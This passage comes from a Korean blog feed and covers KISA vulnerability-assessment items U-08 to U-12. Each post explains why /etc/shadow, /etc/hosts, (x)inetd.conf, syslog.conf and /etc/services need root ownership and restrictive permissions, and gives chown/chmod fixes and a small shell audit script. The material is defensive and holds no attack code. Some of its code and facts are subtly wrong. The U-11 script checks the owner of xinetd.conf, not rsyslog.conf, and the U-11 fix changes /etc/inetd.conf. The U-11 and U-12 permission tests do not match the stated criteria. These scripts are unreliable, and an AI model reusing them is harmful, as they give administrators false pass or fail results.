<p><code>/etc/passwd</code> 파일의 소유자와 권한을 확인해주었습니다.</p>
<br>

<img src="/images/주요정보통신기반시설 취약점 진단 가이드/U-08/ls.png">

<br>

<br>

<hr>
<br>

<h1 id="🔒-조치방법"><a href="#🔒-조치방법" class="headerlink" title="🔒 조치방법"></a>🔒 조치방법</h1><br>

<table>
<thead>
<tr>
<th>OS</th>
<th>파일 위치 및 점검 방법</th>
</tr>
</thead>
<tbody><tr>
<td>SOLARIS,<br />LINUX</td>
<td>1) <code>/etc/shadow</code> 파일의 소유자 및 권한 확인<br />    <code># ls -l /etc/shadow</code><br /><br />2) <code>/etc/shadow</code> 파일의 소유자 및 권한 변경<br />    <code># chown root /etc/shadow</code><br />    <code># chmod 400 /etc/shadow</code></td>
</tr>
<tr>
<td>AIX</td>
<td>AIX 서버는 기본적으로 <code>/etc/security/passwd</code> 파일에 패스워드를 암호화하여 저장, 관리하므로 해당 디렉터리를 권한을 기준에 맞게 설정<br />1) <code>/etc/security/passwd</code> 디렉터리의 소유자 및 권한 확인<br />    <code># ls -ld /etc/security/passwd</code><br /><br />2) <code>/etc/security/passwd</code> 디렉터리의 소유자 및 권한 변경<br />    <code># chown root /etc/security/passwd</code><br />    <code># chmod 400 /etc/security/passwd</code></td>
</tr>
<tr>
<td>HP-UX</td>
<td>HP-UX 서버는 Trusted Mode로 전환할 경우 패스워드를 암호화하여 <code>/tcb/files/auth</code> 디렉터리에 계정 이니셜과 계정명에 따라 파일로 저장, 관리 가능<br />1) <code>/tcb/files/auth</code> 디렉터리의 소유자 및 권한 확인<br />    <code># ls -ld /tcb/files/auth</code><br /><br />2) <code>/tcb/files/auth</code> 디렉터리의 소유자 및 권한 변경<br />    <code># chown root /tcb/files/auth</code><br />    <code># chmod 400 /tcb/files/auth</code></td>
</tr>
</tbody></table>
<br>

<br>

<hr>
<br>

<h1 id="📄-스크립트"><a href="#📄-스크립트" class="headerlink" title="📄 스크립트"></a>📄 스크립트</h1><br>

<figure class="highlight sh"><table><tr><td class="code"><pre><span class="line">ProcessResult=<span class="string">&quot;&quot;</span></span><br><span class="line"></span><br><span class="line">process=`find /etc/shadow -perm 400`</span><br><span class="line">process2=`find /etc/shadow -user root`</span><br><span class="line"><span class="keyword">if</span> [ <span class="string">&quot;<span class="variable">$process</span>&quot;</span> ] &amp;&amp; [ <span class="string">&quot;<span class="variable">$process2</span>&quot;</span> ]</span><br><span class="line"><span class="keyword">then</span></span><br><span class="line">        ProcessResult=양호</span><br><span class="line"><span class="keyword">else</span></span><br><span class="line">        ProcessResult=취약</span><br><span class="line"><span class="keyword">fi</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="built_in">echo</span> -e U-08 [/etc/shadow 파일 소유자 및 권한 설정] : <span class="string">&quot;<span class="variable">$ProcessResult</span>&quot;</span> | tee /root/result/u-08.txt</span><br></pre></td></tr></table></figure>

<br>

<p><code>/etc/shadow</code> 파일의 소유자가 root이고 권한이 400인 경우 <code>양호</code>, 아니면 <code>취약</code> 처리해주었습니다.</p>
<br>

<p>해당 스크립트를 실행시키면 결과를 터미널에 출력하고, <code>/root/result/u-08</code> 파일에 결과가 저장되도록 만들었습니다.</p>
<br>

<br>

<img src="/images/주요정보통신기반시설 취약점 진단 가이드/U-08/script.png">

<br>

<br>

<hr>
<div class="link-grid"><div class="link-grid-container">
<object class="link-grid-image" data="/images/주요정보통신기반시설 취약점 진단 가이드/U-19/logo.png"></object>
<p>주요정보통신기반시설 취약점 진단 가이드 2021</p><p>KISA</p>
<a href="https://www.kisa.or.kr/public/laws/laws3_View.jsp?cPage=1&mode=view&p_No=259&b_No=259&d_No=106&ST=T&SV="></a>
</div></div>
]]></content>
      <categories>
        <category>주요정보통신기반시설 취약점 진단 가이드</category>
      </categories>
      <tags>
        <tag>시스템보안</tag>
        <tag>주요정보통신기반시설 취약점 진단 가이드</tag>
        <tag>UNIX/LINUX</tag>
      </tags>
  </entry>
  <entry>
    <title>[주요정보통신기반시설 취약점 진단 가이드] U-09 /etc/hosts 파일 소유자 및 권한 설정</title>
    <url>/2022/01/23/2022-01-23-%5B%EC%A3%BC%EC%9A%94%EC%A0%95%EB%B3%B4%ED%86%B5%EC%8B%A0%EA%B8%B0%EB%B0%98%EC%8B%9C%EC%84%A4%20%EC%B7%A8%EC%95%BD%EC%A0%90%20%EC%A7%84%EB%8B%A8%20%EA%B0%80%EC%9D%B4%EB%93%9C%5D%20U-09%20hosts%20%ED%8C%8C%EC%9D%BC%20%EC%86%8C%EC%9C%A0%EC%9E%90%20%EB%B0%8F%20%EA%B6%8C%ED%95%9C%20%EC%84%A4%EC%A0%95/</url>
    <content><![CDATA[<h1 id="🔎-점검내용"><a href="#🔎-점검내용" class="headerlink" title="🔎  점검내용"></a>🔎  점검내용</h1><br>

<p><code>/etc/hosts</code> 파일 권한 적절성 점검입니다.</p>
<p>항목코드는 <code>U-09</code>이며, 항목 주요도는 <code>상</code>입니다.</p>
<br>

<br>

<hr>
<br>

<h1 id="🔔-점검-목적"><a href="#🔔-점검-목적" class="headerlink" title="🔔 점검 목적"></a>🔔 점검 목적</h1><br>

<p><code>/etc/hosts</code> 파일을 관리자만 제어할 수 있게 하여 비인가자들의 임의적인 파일 변조를 방지하기 위함입니다.</p>
<br>

<br>

<h2 id="보안위협"><a href="#보안위협" class="headerlink" title="보안위협"></a>보안위협</h2><br>

<p>hosts 파일에 비인가자 쓰기 권한이 부여된 경우 공격자는 hosts 파일에 악의적인 시스템을 등록하여 이를 통해 정상적인 DNS를 우회하여 악성사이트로의 접속을 유도하는 파밍 공격 등에 악용될 수 있습니다.</p>
<p>hosts 파일에 소유자 외 쓰기 권한이 부여된 경우 일반상용자 권한으로 hosts 파일에 변조된 IP주소를 등록하여 정상적인 DNS를 방해하고 악성사이트로의 접속을 유도하는 파밍 공격 등에 악용될 수 있습니다.</p>
<br>

<br>

<hr>
<br>

<h1 id="🤔-점검-방법"><a href="#🤔-점검-방법" class="headerlink" title="🤔 점검 방법"></a>🤔 점검 방법</h1><br>

<p>환경 구성 후 테스트 해보았습니다.</p>
<blockquote>
<p>버전 정보 : CentOS Linux release 7.8.2003 (Core)</p>
</blockquote>
<br>

<br>

<table>
<thead>
<tr>
<th>취약한 서버</th>
</tr>
</thead>
<tbody><tr>
<td>192.168.219.103</td>
</tr>
</tbody></table>
<br>

<br>

<h2 id="OS별-점검-파일-위치-및-점검-방법"><a href="#OS별-점검-파일-위치-및-점검-방법" class="headerlink" title="OS별 점검 파일 위치 및 점검 방법"></a>OS별 점검 파일 위치 및 점검 방법</h2><br>

<blockquote>
<p><strong>양호</strong> : <code>/etc/hosts</code> 파일의 소유자가 root이고, 권한이 600인 이하경우</p>
</blockquote>
<blockquote>
<p><strong>취약</strong> : <code>/etc/hosts</code> 파일의 소유자가 root가 아니거나, 권한이 600 이상인 경우</p>
</blockquote>
<br>

<table>
<thead>
<tr>
<th>OS</th>
<th>파일 위치 및 점검 방법</th>
</tr>
</thead>
<tbody><tr>
<td>SOLARIS,<br />LINUX, AIX,<br />HP-UX</td>
<td><code># ls -l /etc/hosts</code><br />    rw------- root &lt;shadow 파일&gt;</td>
</tr>
</tbody></table>
<br>

<br>

<blockquote>
<p># ls -l /etc/hosts</p>
</blockquote>
<br>

<p><code>/etc/hosts</code> 파일의 소유자와 권한을 확인해주었습니다.</p>
<br>

<img src="/images/주요정보통신기반시설 취약점 진단 가이드/U-09/ls.png">

<br>

<br>

<hr>
<br>

<h1 id="🔒-조치방법"><a href="#🔒-조치방법" class="headerlink" title="🔒 조치방법"></a>🔒 조치방법</h1><br>

<table>
<thead>
<tr>
<th>OS</th>
<th>파일 위치 및 점검 방법</th>
</tr>
</thead>
<tbody><tr>
<td>SOLARIS,<br />LINUX, AIX,<br />HP-UX</td>
<td><code>/etc/hosts</code> 파일의 소유자 및 권한 변경<br />    <code># chown root /etc/hosts</code><br />    <code># chmod 600 /etc/hosts</code></td>
</tr>
</tbody></table>
<br>

<br>

<hr>
<br>

<h1 id="📄-스크립트"><a href="#📄-스크립트" class="headerlink" title="📄 스크립트"></a>📄 스크립트</h1><br>

<figure class="highlight sh"><table><tr><td class="code"><pre><span class="line">ProcessResult=<span class="string">&quot;&quot;</span></span><br><span class="line"></span><br><span class="line">process=`find /etc/hosts -perm 600`</span><br><span class="line">process2=`find /etc/hosts -user root`</span><br><span class="line"><span class="keyword">if</span> [ <span class="string">&quot;<span class="variable">$process</span>&quot;</span> ] &amp;&amp; [ <span class="string">&quot;<span class="variable">$process2</span>&quot;</span> ]</span><br><span class="line"><span class="keyword">then</span></span><br><span class="line">        ProcessResult=양호</span><br><span class="line"><span class="keyword">else</span></span><br><span class="line">        ProcessResult=취약</span><br><span class="line"><span class="keyword">fi</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="built_in">echo</span> -e U-09 [/etc/hosts 파일 소유자 및 권한 설정] : <span class="string">&quot;<span class="variable">$ProcessResult</span>&quot;</span> | tee /root/result/u-09.txt</span><br></pre></td></tr></table></figure>

<br>

<p><code>/etc/hosts</code> 파일의 소유자가 root이고 권한이 600인 경우 <code>양호</code>, 아니면 <code>취약</code> 처리해주었습니다.</p>
<br>

<p>해당 스크립트를 실행시키면 결과를 터미널에 출력하고, <code>/root/result/u-09</code> 파일에 결과가 저장되도록 만들었습니다.</p>
<br>

<br>

<img src="/images/주요정보통신기반시설 취약점 진단 가이드/U-09/script.png">

<br>

<br>

<hr>
<div class="link-grid"><div class="link-grid-container">
<object class="link-grid-image" data="/images/주요정보통신기반시설 취약점 진단 가이드/U-19/logo.png"></object>
<p>주요정보통신기반시설 취약점 진단 가이드 2021</p><p>KISA</p>
<a href="https://www.kisa.or.kr/public/laws/laws3_View.jsp?cPage=1&mode=view&p_No=259&b_No=259&d_No=106&ST=T&SV="></a>
</div></div>
]]></content>
      <categories>
        <category>주요정보통신기반시설 취약점 진단 가이드</category>
      </categories>
      <tags>
        <tag>시스템보안</tag>
        <tag>주요정보통신기반시설 취약점 진단 가이드</tag>
        <tag>UNIX/LINUX</tag>
      </tags>
  </entry>
  <entry>
    <title>[주요정보통신기반시설 취약점 진단 가이드] U-10 /etc/(x)inetd.conf 파일 소유자 및 권한 설정</title>
    <url>/2022/01/23/2022-01-23-%5B%EC%A3%BC%EC%9A%94%EC%A0%95%EB%B3%B4%ED%86%B5%EC%8B%A0%EA%B8%B0%EB%B0%98%EC%8B%9C%EC%84%A4%20%EC%B7%A8%EC%95%BD%EC%A0%90%20%EC%A7%84%EB%8B%A8%20%EA%B0%80%EC%9D%B4%EB%93%9C%5D%20U-10%20(x)inetd.conf%20%ED%8C%8C%EC%9D%BC%20%EC%86%8C%EC%9C%A0%EC%9E%90%20%EB%B0%8F%20%EA%B6%8C%ED%95%9C%20%EC%84%A4%EC%A0%95/</url>
    <content><![CDATA[<h1 id="🔎-점검내용"><a href="#🔎-점검내용" class="headerlink" title="🔎  점검내용"></a>🔎  점검내용</h1><br>

<p><code>/etc/(x)inetd.conf</code> 파일 권한 적절성 점검입니다.</p>
<p>항목코드는 <code>U-10</code>이며, 항목 주요도는 <code>상</code>입니다.</p>
<br>

<br>

<hr>
<br>

<h1 id="🔔-점검-목적"><a href="#🔔-점검-목적" class="headerlink" title="🔔 점검 목적"></a>🔔 점검 목적</h1><br>

<p> <code>/etc/(x)inetd.conf</code> 파일을 관리자만 제어할 수 있게 하여 비인가자들의 임의 적인 파일 변조를 방지하기 위함입니다.</p>
<br>

<br>

<h2 id="보안위협"><a href="#보안위협" class="headerlink" title="보안위협"></a>보안위협</h2><br>

<p>(x)inetd.conf 파일에 소유자외 쓰기 권한이 부여된 경우 일반사용자 권한으로 (x)inetd.conf 파일에 등록된 서비스를 변조하거나 악의적인 프로그램(서비스)를 등록할 수 있습니다.</p>
<br>

<br>

<hr>
<br>

<h1 id="🤔-점검-방법"><a href="#🤔-점검-방법" class="headerlink" title="🤔 점검 방법"></a>🤔 점검 방법</h1><br>

<p>환경 구성 후 테스트 해보았습니다.</p>
<blockquote>
<p>버전 정보 : CentOS Linux release 7.8.2003 (Core)</p>
</blockquote>
<br>

<br>

<table>
<thead>
<tr>
<th>취약한 서버</th>
</tr>
</thead>
<tbody><tr>
<td>192.168.219.103</td>
</tr>
</tbody></table>
<br>

<br>

<h2 id="OS별-점검-파일-위치-및-점검-방법"><a href="#OS별-점검-파일-위치-및-점검-방법" class="headerlink" title="OS별 점검 파일 위치 및 점검 방법"></a>OS별 점검 파일 위치 및 점검 방법</h2><br>

<blockquote>
<p><strong>양호</strong> : <code>/etc/inetd.conf</code> 파일의 소유자가 root이고, 권한이 600인 경우</p>
</blockquote>
<blockquote>
<p><strong>취약</strong> : <code>/etc/inetd.conf</code> 파일의 소유자가 root가 아니거나, 권한이 600이 아닌 경우</p>
</blockquote>
<br>

<table>
<thead>
<tr>
<th>OS</th>
<th>파일 위치 및 점검 방법</th>
</tr>
</thead>
<tbody><tr>
<td>SOLARIS,<br />LINUX, AIX,<br />HP-UX</td>
<td><code>/etc/inetd.conf</code> 파일의 소유자 및 권한 확인<br />    <code># ls -l /etc/inetd.conf</code><br />    rw------- root &lt;inetd.conf 파일&gt;</td>
</tr>
<tr>
<td>LINUX<br />(xinetd)</td>
<td><code>/etc/xinetd.conf</code> 파일 및 <code>/etcxinetd.d/</code> 하위 모든 파일의 소유자 및 권한 확인<br />    <code># ls -l /etc/xinetd.conf</code><br />    <code># ls -al /etc/xinetd.d/*</code><br />    rw------- root &lt;xinetd.conf 파일&gt;<br />    rw------- root &lt;xinetd 디렉터리 내 모든 파일&gt;</td>
</tr>
</tbody></table>
<br>

<br>

<blockquote>
<p># ls -l /etc/xinetd.conf</p>
<p># ls -l /etc/xinetd.d/*</p>
</blockquote>
<br>

<p><code>/etc/xinetd.conf</code> <code>/etc/xinetd.d/*</code> 파일의 소유자와 권한을 확인해주었습니다.</p>
<br>

<img src="/images/주요정보통신기반시설 취약점 진단 가이드/U-10/ls.png">

<br>

<br>

<hr>
<br>

<h1 id="🔒-조치방법"><a href="#🔒-조치방법" class="headerlink" title="🔒 조치방법"></a>🔒 조치방법</h1><br>

<table>
<thead>
<tr>
<th>OS</th>
<th>파일 위치 및 점검 방법</th>
</tr>
</thead>
<tbody><tr>
<td>SOLARIS,<br />LINUX, AIX,<br />HP-UX</td>
<td><code>/etc/inetd.conf</code> 파일의 소유자 및 권한 변경<br />    <code># chown root /etc/inetd.conf</code><br />    <code># chmod 600 /etc/inetd.conf</code></td>
</tr>
<tr>
<td>LINUX<br />(xinetd)</td>
<td><code>/etc/xinetd.conf</code> 파일의 소유자 및 권한 변경<br />    <code># chown root /etc/xinetd.conf</code><br />    <code># chmod 600 /etc/xinetd.conf</code><br /><code>/etc/xinetd.d/</code> 하위 디렉터리도 위와 동일한 방법으로 조치</td>
</tr>
</tbody></table>
<br>

<br>

<hr>
<br>

<h1 id="📄-스크립트"><a href="#📄-스크립트" class="headerlink" title="📄 스크립트"></a>📄 스크립트</h1><br>

<figure class="highlight sh"><table><tr><td class="code"><pre><span class="line">ProcessResult=<span class="string">&quot;&quot;</span></span><br><span class="line"></span><br><span class="line">process=`find /etc/xinetd.conf -not -perm 600`</span><br><span class="line">process2=`find /etc/xinetd.conf -not -user root`</span><br><span class="line">process3=`find /etc/xinetd.d/* -not -perm 600`</span><br><span class="line">process4=`find /etc/xinetd.d/* -not -user root`</span><br><span class="line"><span class="keyword">if</span> [ <span class="string">&quot;<span class="variable">$process</span>&quot;</span> ] || [ <span class="string">&quot;<span class="variable">$process2</span>&quot;</span> ] || [ <span class="string">&quot;<span class="variable">$process3</span>&quot;</span> ] || [ <span class="string">&quot;<span class="variable">$process4</span>&quot;</span> ]</span><br><span class="line"><span class="keyword">then</span></span><br><span class="line">        ProcessResult=취약</span><br><span class="line"><span class="keyword">else</span></span><br><span class="line">        ProcessResult=양호</span><br><span class="line"><span class="keyword">fi</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="built_in">echo</span> -e U-10 [/etc/\(x\)inetd.conf 파일 소유자 및 권한 설정] : <span class="string">&quot;<span class="variable">$ProcessResult</span>&quot;</span> | tee /root/result/u-10.txt</span><br></pre></td></tr></table></figure>

<br>

<p><code>/etc/xinetd.conf</code> <code>/etc/xinetd.d/*</code> 파일의 소유자가 root가 아니거나 권한이 600이 아닌경우 <code>취약</code>, 아니면 <code>양호</code> 처리해주었습니다.</p>
<br>

<p>해당 스크립트를 실행시키면 결과를 터미널에 출력하고, <code>/root/result/u-10</code> 파일에 결과가 저장되도록 만들었습니다.</p>
<br>

<br>

<img src="/images/주요정보통신기반시설 취약점 진단 가이드/U-10/script.png">

<br>

<br>

<hr>
<div class="link-grid"><div class="link-grid-container">
<object class="link-grid-image" data="/images/주요정보통신기반시설 취약점 진단 가이드/U-19/logo.png"></object>
<p>주요정보통신기반시설 취약점 진단 가이드 2021</p><p>KISA</p>
<a href="https://www.kisa.or.kr/public/laws/laws3_View.jsp?cPage=1&mode=view&p_No=259&b_No=259&d_No=106&ST=T&SV="></a>
</div></div>
]]></content>
      <categories>
        <category>주요정보통신기반시설 취약점 진단 가이드</category>
      </categories>
      <tags>
        <tag>시스템보안</tag>
        <tag>주요정보통신기반시설 취약점 진단 가이드</tag>
        <tag>UNIX/LINUX</tag>
      </tags>
  </entry>
  <entry>
    <title>[주요정보통신기반시설 취약점 진단 가이드] U-11 /etc/syslog.conf 파일 소유자 및 권한 설정</title>
    <url>/2022/01/23/2022-01-23-%5B%EC%A3%BC%EC%9A%94%EC%A0%95%EB%B3%B4%ED%86%B5%EC%8B%A0%EA%B8%B0%EB%B0%98%EC%8B%9C%EC%84%A4%20%EC%B7%A8%EC%95%BD%EC%A0%90%20%EC%A7%84%EB%8B%A8%20%EA%B0%80%EC%9D%B4%EB%93%9C%5D%20U-11%20syslog.conf%20%ED%8C%8C%EC%9D%BC%20%EC%86%8C%EC%9C%A0%EC%9E%90%20%EB%B0%8F%20%EA%B6%8C%ED%95%9C%20%EC%84%A4%EC%A0%95/</url>
    <content><![CDATA[<h1 id="🔎-점검내용"><a href="#🔎-점검내용" class="headerlink" title="🔎  점검내용"></a>🔎  점검내용</h1><br>

<p><code>/etc/syslog.conf</code> 파일 권한 적절성 점검입니다.</p>
<p>항목코드는 <code>U-11</code>이며, 항목 주요도는 <code>상</code>입니다.</p>
<br>

<br>

<hr>
<br>

<h1 id="🔔-점검-목적"><a href="#🔔-점검-목적" class="headerlink" title="🔔 점검 목적"></a>🔔 점검 목적</h1><br>

<p><code>/etc/syslog.conf</code> 파일의 권한 적절성을 점검하여 관리자 외 비인가자의 임의적인 <code>syslog.conf</code> 파일 변조를 방지하기 위함입니다.</p>
<br>

<br>

<h2 id="보안위협"><a href="#보안위협" class="headerlink" title="보안위협"></a>보안위협</h2><br>

<p><code>syslog.conf</code> 파일의 설정내용을 참조하여 로그의 저장위치가 노출되며 로그를 기록하지 않도록 설정하거나 대량의 로그를 기록하게 하여 시스템 과부 하를 유도할 수 있습니다.</p>
<br>

<br>

<hr>
<br>

<h1 id="🤔-점검-방법"><a href="#🤔-점검-방법" class="headerlink" title="🤔 점검 방법"></a>🤔 점검 방법</h1><br>

<p>환경 구성 후 테스트 해보았습니다.</p>
<blockquote>
<p>버전 정보 : CentOS Linux release 7.8.2003 (Core)</p>
</blockquote>
<br>

<br>

<table>
<thead>
<tr>
<th>취약한 서버</th>
</tr>
</thead>
<tbody><tr>
<td>192.168.219.103</td>
</tr>
</tbody></table>
<br>

<br>

<h2 id="OS별-점검-파일-위치-및-점검-방법"><a href="#OS별-점검-파일-위치-및-점검-방법" class="headerlink" title="OS별 점검 파일 위치 및 점검 방법"></a>OS별 점검 파일 위치 및 점검 방법</h2><br>

<blockquote>
<p><strong>양호</strong> : <code>/etc/syslog.conf</code> 파일의 소유자가 root(또는 bin, sys)이고, 권한이 640 이 하인 경우</p>
</blockquote>
<blockquote>
<p><strong>취약</strong> : <code>/etc/syslog.conf</code> 파일의 소유자가 root(또는 bin, sys)가 아니거나, 권한이  640 이하가 아닌 경우</p>
</blockquote>
<br>

<table>
<thead>
<tr>
<th>OS</th>
<th>파일 위치 및 점검 방법</th>
</tr>
</thead>
<tbody><tr>
<td>SOLARIS,<br />LINUX, AIX,<br />HP-UX</td>
<td><code>/etc/syslog.conf</code> 파일의 소유자 및 권한 확인<br />    <code># ls -l /etc/syslog.conf</code><br />    rw-r----- root &lt;syslog.conf 파일&gt;</td>
</tr>
<tr>
<td>LINUX<br />(CentOS 6 이상일 경우)</td>
<td><code>/etc/rsyslog.conf</code> 파일의 소유자 및 권한 확인<br />    <code># ls -l /etc/rsyslog.conf</code><br />    rw-r----- root &lt;rsyslog.conf 파일&gt;</td>
</tr>
</tbody></table>
<br>

<br>

<blockquote>
<p># ls -l /etc/rsyslog.conf</p>
</blockquote>
<br>

<p><code>rsyslog.conf</code> 파일의 소유자와 권한을 확인해주었습니다.</p>
<br>

<img src="/images/주요정보통신기반시설 취약점 진단 가이드/U-11/ls.png">

<br>

<br>

<hr>
<br>

<h1 id="🔒-조치방법"><a href="#🔒-조치방법" class="headerlink" title="🔒 조치방법"></a>🔒 조치방법</h1><br>

<table>
<thead>
<tr>
<th>OS</th>
<th>파일 위치 및 점검 방법</th>
</tr>
</thead>
<tbody><tr>
<td>SOLARIS,<br />LINUX, AIX,<br />HP-UX</td>
<td><code>/etc/syslog.conf</code> 파일의 소유자 및 권한 변경<br />    <code># chown root /etc/inetd.conf</code><br />    <code># chmod 640 /etc/inetd.conf</code></td>
</tr>
<tr>
<td>LINUX<br />(CentOS 6 이상일 경우)</td>
<td><code>/etc/rsyslog.conf</code> 파일의 소유자 및 권한 변경<br />    <code># chown root /etc/rsyslog.conf</code><br />    <code># chmod 640 /etc/rsyslog.conf</code></td>
</tr>
</tbody></table>
<br>

<br>

<hr>
<br>

<h1 id="📄-스크립트"><a href="#📄-스크립트" class="headerlink" title="📄 스크립트"></a>📄 스크립트</h1><br>

<figure class="highlight sh"><table><tr><td class="code"><pre><span class="line">ProcessResult=<span class="string">&quot;&quot;</span></span><br><span class="line"></span><br><span class="line">process=`find /etc/rsyslog.conf -perm -640`</span><br><span class="line">process2=`find /etc/xinetd.conf -not -user root`</span><br><span class="line"><span class="keyword">if</span> [ <span class="string">&quot;<span class="variable">$process</span>&quot;</span> ]</span><br><span class="line"><span class="keyword">then</span></span><br><span class="line">        ProcessResult=취약</span><br><span class="line"><span class="keyword">else</span></span><br><span class="line">        <span class="keyword">if</span> [ <span class="string">&quot;<span class="variable">$process2</span>&quot;</span> ]</span><br><span class="line">        <span class="keyword">then</span></span><br><span class="line">                ProcessResult=취약</span><br><span class="line">        <span class="keyword">else</span></span><br><span class="line">                ProcessResult=양호</span><br><span class="line">        <span class="keyword">fi</span></span><br><span class="line"><span class="keyword">fi</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="built_in">echo</span> -e U-11 [/etc/syslog.conf 파일 소유자 및 권한 설정] : <span class="string">&quot;<span class="variable">$ProcessResult</span>&quot;</span> | tee /root/result/u-11.txt</span><br></pre></td></tr></table></figure>

<br>

<p><code>/etc/rsyslog.conf</code> 파일의 소유자가 root가 아니거나 권한이 640 이하일 경우 <code>취약</code>, 아니면 <code>양호</code> 처리해주었습니다.</p>
<br>

<p>해당 스크립트를 실행시키면 결과를 터미널에 출력하고, <code>/root/result/u-11</code> 파일에 결과가 저장되도록 만들었습니다.</p>
<br>

<br>

<img src="/images/주요정보통신기반시설 취약점 진단 가이드/U-11/script.png">

<br>

<br>

<hr>
<div class="link-grid"><div class="link-grid-container">
<object class="link-grid-image" data="/images/주요정보통신기반시설 취약점 진단 가이드/U-19/logo.png"></object>
<p>주요정보통신기반시설 취약점 진단 가이드 2021</p><p>KISA</p>
<a href="https://www.kisa.or.kr/public/laws/laws3_View.jsp?cPage=1&mode=view&p_No=259&b_No=259&d_No=106&ST=T&SV="></a>
</div></div>
]]></content>
      <categories>
        <category>주요정보통신기반시설 취약점 진단 가이드</category>
      </categories>
      <tags>
        <tag>시스템보안</tag>
        <tag>주요정보통신기반시설 취약점 진단 가이드</tag>
        <tag>UNIX/LINUX</tag>
      </tags>
  </entry>
  <entry>
    <title>[주요정보통신기반시설 취약점 진단 가이드] U-12 /etc/services 파일 소유자 및 권한 설정</title>
    <url>/2022/01/23/2022-01-23-%5B%EC%A3%BC%EC%9A%94%EC%A0%95%EB%B3%B4%ED%86%B5%EC%8B%A0%EA%B8%B0%EB%B0%98%EC%8B%9C%EC%84%A4%20%EC%B7%A8%EC%95%BD%EC%A0%90%20%EC%A7%84%EB%8B%A8%20%EA%B0%80%EC%9D%B4%EB%93%9C%5D%20U-12%20services%20%ED%8C%8C%EC%9D%BC%20%EC%86%8C%EC%9C%A0%EC%9E%90%20%EB%B0%8F%20%EA%B6%8C%ED%95%9C%20%EC%84%A4%EC%A0%95/</url>
    <content><![CDATA[<h1 id="🔎-점검내용"><a href="#🔎-점검내용" class="headerlink" title="🔎  점검내용"></a>🔎  점검내용</h1><br>

<p><code>/etc/services</code> 파일 권한 적절성 점검입니다.</p>
<p>항목코드는 <code>U-12</code>이며, 항목 주요도는 <code>상</code>입니다.</p>
<br>

<br>

<hr>
<br>

<h1 id="🔔-점검-목적"><a href="#🔔-점검-목적" class="headerlink" title="🔔 점검 목적"></a>🔔 점검 목적</h1><br>

<p> <code>/etc/services</code> 파일을 관리자만 제어할 수 있게 하여 비인가자들의 임의적인  파일 변조를 방지하기 위함입니다.</p>
<br>

<br>

<h2 id="보안위협"><a href="#보안위협" class="headerlink" title="보안위협"></a>보안위협</h2><br>

<p><code>services</code> 파일의 접근권한이 적절하지 않을 경우 비인가 사용자가 운영 포트 번호를 변경하여 정상적인 서비스를 제한하거나 허용되지 않은 포트를 오픈 하여 악성 서비스를 의도적으로 실행할 수 있습니다.</p>
<br>

<br>

<hr>
<br>

<h1 id="🤔-점검-방법"><a href="#🤔-점검-방법" class="headerlink" title="🤔 점검 방법"></a>🤔 점검 방법</h1><br>

<p>환경 구성 후 테스트 해보았습니다.</p>
<blockquote>
<p>버전 정보 : CentOS Linux release 7.8.2003 (Core)</p>
</blockquote>
<br>

<br>

<table>
<thead>
<tr>
<th>취약한 서버</th>
</tr>
</thead>
<tbody><tr>
<td>192.168.219.103</td>
</tr>
</tbody></table>
<br>

<br>

<h2 id="OS별-점검-파일-위치-및-점검-방법"><a href="#OS별-점검-파일-위치-및-점검-방법" class="headerlink" title="OS별 점검 파일 위치 및 점검 방법"></a>OS별 점검 파일 위치 및 점검 방법</h2><br>

<blockquote>
<p><strong>양호</strong> : <code>/etc/services</code> 파일의 소유자가 root(또는 bin, sys)이고, 권한이 644 이하 인 경우</p>
</blockquote>
<blockquote>
<p><strong>취약</strong> : <code>/etc/services</code> 파일의 소유자가 root(또는 bin, sys)가 아니거나, 권한이 644  이하가 아닌 경우</p>
</blockquote>
<br>

<table>
<thead>
<tr>
<th>OS</th>
<th>파일 위치 및 점검 방법</th>
</tr>
</thead>
<tbody><tr>
<td>SOLARIS,<br />LINUX, AIX,<br />HP-UX</td>
<td><code>/etc/services</code> 파일의 소유자 및 권한 확인<br />    <code># ls -l /etc/services</code><br />    rw-r--r-- root &lt;services 파일&gt;</td>
</tr>
</tbody></table>
<br>

<br>

<blockquote>
<p># ls -l /etc/services</p>
</blockquote>
<br>

<p><code>/etc/services</code> 파일의 소유자와 권한을 확인해주었습니다.</p>
<br>

<img src="/images/주요정보통신기반시설 취약점 진단 가이드/U-12/ls.png">

<br>

<br>

<hr>
<br>

<h1 id="🔒-조치방법"><a href="#🔒-조치방법" class="headerlink" title="🔒 조치방법"></a>🔒 조치방법</h1><br>

<table>
<thead>
<tr>
<th>OS</th>
<th>파일 위치 및 점검 방법</th>
</tr>
</thead>
<tbody><tr>
<td>SOLARIS,<br />LINUX, AIX,<br />HP-UX</td>
<td><code>/etc/services</code> 파일의 소유자 및 권한 변경<br />    <code># chown root /etc/services</code><br />    <code># chmod 644 /etc/services</code></td>
</tr>
</tbody></table>
<br>

<br>

<hr>
<br>

<h1 id="📄-스크립트"><a href="#📄-스크립트" class="headerlink" title="📄 스크립트"></a>📄 스크립트</h1><br>

<figure class="highlight sh"><table><tr><td class="code"><pre><span class="line">ProcessResult=<span class="string">&quot;&quot;</span></span><br><span class="line"></span><br><span class="line">process=`find /etc/services -perm -645`</span><br><span class="line">process2=`find /etc/services -not -user root`</span><br><span class="line"><span class="keyword">if</span> [ <span class="string">&quot;<span class="variable">$process</span>&quot;</span> ]</span><br><span class="line"><span class="keyword">then</span></span><br><span class="line">        ProcessResult=취약</span><br><span class="line"><span class="keyword">else</span></span><br><span class="line">        <span class="keyword">if</span> [ <span class="string">&quot;<span class="variable">$process2</span>&quot;</span> ]</span><br><span class="line">        <span class="keyword">then</span></span><br><span class="line">                ProcessResult=취약</span><br><span class="line">        <span class="keyword">else</span></span><br><span class="line">                ProcessResult=양호</span><br><span class="line">        <span class="keyword">fi</span></span><br><span class="line"><span class="keyword">fi</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="built_in">echo</span> -e U-12 [/etc/services 파일 소유자 및 권한 설정] : <span class="string">&quot;<span class="variable">$ProcessResult</span>&quot;</span> | tee /root/result/u-12.txt</span><br></pre></td></tr></table></figure>

<br>

<p><code>/etc/services</code> 파일의 소유자가 root가 아니거나 권한이 644 이하일 경우 <code>취약</code>, 아니면 <code>양호</code> 처리해주었습니다.</p>
<br>

<p>해당 스크립트를 실행시키면 결과를 터미널에 출력하고, <code>/root/result/u-12</code> 파일에 결과가 저장되도록 만들었습니다.</p>
<br>

<br>

